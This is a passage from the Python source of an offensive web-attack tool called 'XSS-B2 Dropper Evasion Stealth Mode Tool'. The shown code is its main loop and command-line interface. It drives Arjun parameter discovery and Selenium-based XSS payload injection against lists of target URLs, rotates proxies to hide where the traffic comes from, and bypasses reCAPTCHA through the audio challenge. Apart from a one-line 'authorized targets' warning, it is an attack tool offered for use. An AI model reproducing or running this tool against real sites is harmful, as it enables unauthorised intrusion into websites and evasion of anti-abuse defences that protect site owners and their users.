{BOLD}{GREEN}o88o  o888o o88oooo888 o88oooo888          o888ooo888  o8888oooo88{RESET}


{BOLD}{GREEN}   XSS-B2 Dropper Evasion Stealth Mode Tool v2.3{RESET}
{BOLD}{RED}           MATRIX XSS ATTACK{RESET}
{RED}    Warning: Use only on authorized targets!{RESET}

"""
        print(logo)
    
    def run(self):
        """Main execution method"""
        self.print_logo()
        method = getattr(self.args, 'method', 'GET').upper()
        self.logger.info(f"Starting XSS-B2 Dropper Evasion Stealth Mode Tool v2.3 - Method: {method}")

        if self.use_terminal_bar:
            self.logger.info(f"Terminal progress bar: {GREEN}Enabled{RESET}")
        else:
            self.logger.info(f"Terminal progress bar: {YELLOW}Disabled{RESET} (use --tbar to enable)")
        
        if self.proxy_manager.proxies:
            if self.proxy_manager.has_working_proxies():
                self.logger.proxy_info(f"Proxy rotation enabled with {len(self.proxy_manager.working_proxies)} working proxies")
                self.logger.info("Note: Proxy rotation used for XSS payload testing only (Arjun uses direct connection)")
            else:
                self.logger.warning("No working proxies found - using direct connection")
        else:
            self.logger.info("No proxy file specified - using direct connection")
            
        if self.bypass_recaptcha:
            self.logger.info(f"reCAPTCHA bypass: {GREEN}Enabled{RESET}")
        else:
            self.logger.info(f"reCAPTCHA bypass: {YELLOW}Disabled{RESET}")
            
        self.logger.info("Warning: Use only on authorized targets!")
        
        # Create output directory
        os.makedirs(self.args.output_dir, exist_ok=True)
        
        # Load targets
        targets = self.load_targets()
        all_results = []
        
        with self.setup_browser() as driver:
            for target_num, target in enumerate(targets, 1):
                self.logger.info(f"\n[{target_num}/{len(targets)}] Processing target: {target}")
                
                # Generate output filenames
                target_name = target.replace("://", "_").replace("/", "_").replace(":", "_").strip("_")
                
                if method == "GET":
                    # GET method: Run Arjun first, then test parameters
                    arjun_output = os.path.join(self.args.output_dir, f"{target_name}_arjun.txt")
                    arjun_stdout = self.run_arjun(target, arjun_output)
                    
                    # Extract parameters
                    params = self.parse_arjun_output(arjun_output)
                    if not params:
                        params = self.parse_arjun_stdout(arjun_stdout)
                    
                    if not params:
                        self.logger.warning(f"No parameters found for {target}, skipping XSS tests")
                        continue
                    
                    self.logger.info(f"Found {len(params)} parameters: {', '.join(params)}")
                    
                    # Test XSS with GET method (this uses proxy rotation)
                    result_file = os.path.join(self.args.output_dir, f"{target_name}_real_xss_results.txt")
                    vulnerabilities = self.test_xss_get(driver, target, params, result_file)
                    all_results.extend(vulnerabilities)
                    
                else:  # POST method
                    # POST method: Skip Arjun, test form inputs directly (this uses proxy rotation)
                    self.logger.info("POST method selected - skipping Arjun, testing form inputs directly")
                    
                    # Test XSS with POST method
                    result_file = os.path.join(self.args.output_dir, f"{target_name}_real_post_xss_results.txt")
                    vulnerabilities = self.test_post_xss(driver, target, result_file)
                    all_results.extend(vulnerabilities)
                
                if vulnerabilities:
                    self.logger.success(f"🚨 Completed testing {target} - Found {len(vulnerabilities)} REAL vulnerabilities")
                else:
                    self.logger.info(f"✓ Completed testing {target} - No real XSS vulnerabilities found")
        
        # Generate reports
        self.generate_json_report(all_results, self.args.output_dir)
        self.print_summary(all_results)
        
        if all_results:
            self.logger.success("🚨 XSS scanning completed - REAL vulnerabilities found!")
        else:
            self.logger.success("✓ XSS scanning completed - No real vulnerabilities found!")

def print_help_logo():
    """Print XSS-B2 logo for help display"""
    logo = f"""
{BOLD}{GREEN}ooooo  oooo  oooooooo8  oooooooo8          oooooooooo    ooooooo   
{BOLD}{GREEN}  888  88   888        888                  888    888 o88     888 
{BOLD}{GREEN}    888      888oooooo  888oooooo ooooooooo 888oooo88        o888  
{BOLD}{GREEN}   88 888           888        888          888    888    o888   o 
{BOLD}{GREEN}o88o  o888o o88oooo888 o88oooo888          o888ooo888  o8888oooo88{RESET}

{BOLD}{GREEN}   XSS-B2 Dropper Evasion Stealth Mode Tool v2.3{RESET}
{BOLD}{RED}           MATRIX XSS ATTACK{RESET}

{BOLD}{BLUE}   Styles, steelos, we bring many kilos
So you could pick yours, from the various...{RESET}
"""
    print(logo)

def main():
    # Check if running on Kali Linux and handle dependencies
    if '--check-deps' in sys.argv or '--install-deps' in sys.argv:
        check_dependencies()
        if '--check-deps' in sys.argv:
            print(f"{GREEN}[+]{RESET} All dependencies checked!")
        sys.exit(0)
    
    parser = argparse.ArgumentParser(
        description=f"""

{RED}WARNING: Use only on authorized targets!{RESET}
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False  # We'll handle help manually to show logo
    )
    
    # Add help option manually
    parser.add_argument('-h', '--help', action='store_true', help='Show this help message and exit')
    
    # Dependency management
    parser.add_argument('--install-deps', action='store_true', help='Install all required dependencies and exit')
    parser.add_argument('--check-deps', action='store_true', help='Check all dependencies and exit')
    
    # Target options
    target_group = parser.add_mutually_exclusive_group(required=False)
    target_group.add_argument("-u", "--url", metavar="URL", help="Single target URL")
    target_group.add_argument("-l", "--list", metavar="FILE", help="File with list of URLs")
    
    # Output options
    parser.add_argument("-o", "--output-dir", metavar="DIR", 
                       help="Output directory for results (required for scanning)")
    
    # Proxy options
    parser.add_argument("-p", "--proxy", metavar="FILE",
                       help="File containing proxy list (HTTP, HTTPS, SOCKS5)")
    parser.add_argument("--proxy-only", action="store_true",
                       help="Force proxy-only mode (no direct connection fallback)")
    parser.add_argument("--test-proxies", action="store_true",
                       help="Test all proxies and exit (useful for validation)")
    
    # Browser options
    parser.add_argument("--show-browser", action="store_true", 
                       help="Show browser (run in visible mode)")
    parser.add_argument("--timeout", type=int, default=10, metavar="SEC",
                       help="Page load timeout in seconds (default: 10)")
    
    # Scanning options
    parser.add_argument("--delay", type=int, default=1, metavar="SEC",
                       help="Delay between requests in seconds (default: 1)")
    parser.add_argument("--threads", type=int, default=5, metavar="NUM",
                       help="Number of threads for Arjun (default: 5)")
    parser.add_argument("--payloads", metavar="FILE",
                       help="Custom XSS payloads file (one per line)")
    parser.add_argument("-m", "--method", choices=["GET", "POST"], default="GET",
                       help="HTTP method for testing payloads (default: GET)")
    parser.add_argument("--bypassrecaptcha", action="store_true",
                       help="Enable reCAPTCHA bypass using audio challenge")
    
    # Terminal UI options
    parser.add_argument("--tbar", action="store_true",
                       help="Enable terminal progress bar (requires rich)")
    
    # Logging options
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Enable verbose/debug output")
    parser.add_argument("--log-file", metavar="FILE",
                       help="Save logs to file")
    
    # Parse arguments (but don't exit on error yet)
    try:
        args = parser.parse_args()
    except SystemExit:
        # If no arguments provided or invalid arguments, show help
        print_help_logo()
        parser.print_help()
        sys.exit(1)
    
    # Handle help manually
    if hasattr(args, 'help') and args.help:
        print_help_logo()
        parser.print_help()
        sys.exit(0)
    
    # If no arguments provided, show help
    if len(sys.argv) == 1:
        print_help_logo()
        parser.print_help()
        sys.exit(0)
    
    # Handle dependency installation
    if hasattr(args, 'install_deps') and args.install_deps:
        check_dependencies()
        print(f"{GREEN}[+]{RESET} All dependencies installed successfully!")
        print(f"{YELLOW}[!]{RESET} You can now run XSS scans normally.")
        sys.exit(0)
    
    # Handle dependency checking
    if hasattr(args, 'check_deps') and args.check_deps:
        check_dependencies()
        print(f"{GREEN}[+]{RESET} All dependencies are properly installed!")
        sys.exit(0)
    
    # Handle proxy testing mode
    if hasattr(args, 'test_proxies') and args.test_proxies:
        if not args.proxy:
            print(f"{RED}[!]{RESET} --test-proxies requires -p/--proxy to specify proxy file")
            sys.exit(1)
        
        # Create temporary logger for proxy testing
        logger = Logger(None, args.verbose if hasattr(args, 'verbose') else False)
        
        logger.info("Proxy testing mode - testing all proxies and exiting")
        proxy_manager = ProxyManager(args.proxy, logger)
        
        if proxy_manager.working_proxies:
            logger.success(f"✓ Proxy testing completed!")
            logger.success(f"✓ Working proxies: {len(proxy_manager.working_proxies)}/{len(proxy_manager.proxies)}")
            
            print(f"\n{BOLD}{GREEN}Working Proxies:{RESET}")
            for proxy in proxy_manager.working_proxies:
                parsed = urlparse(proxy)
                print(f"  {GREEN}✓ {parsed.hostname}:{parsed.port}{RESET}")
            
            if proxy_manager.failed_proxies:
                print(f"\n{BOLD}{RED}Failed Proxies:{RESET}")
                for proxy in proxy_manager.failed_proxies:
                    parsed = urlparse(proxy)
                    print(f"  {RED}✗ {parsed.hostname}:{parsed.port}{RESET}")
        else:
            logger.error("No working proxies found!")
            sys.exit(1)
        
        sys.exit(0)
    
    # Validate required arguments for scanning
    if not (args.url or args.list):
        print(f"{RED}[!]{RESET} Please specify either -u/--url or -l/--list for scanning")
        print(f"{YELLOW}[!]{RESET} Use -h/--help for usage examples")
        print(f"{YELLOW}[!]{RESET} Use --install-deps to install dependencies")
        sys.exit(1)
    
    if not args.output_dir:
        print(f"{RED}[!]{RESET} Output directory (-o/--output-dir) is required for scanning")
        print(f"{YELLOW}[!]{RESET} Use -h/--help for usage examples")
        sys.exit(1)
    
    # Check basic dependencies before running
    try:
        import selenium
        import requests
        import bs4
        import pydub
        import speech_recognition
    except ImportError as e:
        print(f"{RED}[!]{RESET} Missing dependency: {str(e)}")
        print(f"{YELLOW}[!]{RESET} Run: python3 xss-b2.py --install-deps")
        sys.exit(1)
    
    # Setup logger
    log_file = args.log_file or os.path.join(args.output_dir, "real_xss_scan.log")
    logger = Logger(log_file, args.verbose)
    
    # Create and run scanner
    scanner = XSSScanner(args, logger)
    
    try:
        scanner.run()
    except KeyboardInterrupt:
        logger.warning("Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        if args.verbose:
            import traceback
            logger.error(traceback.format_exc())
        sys.exit(1)

if __name__ == "__main__":
    main()
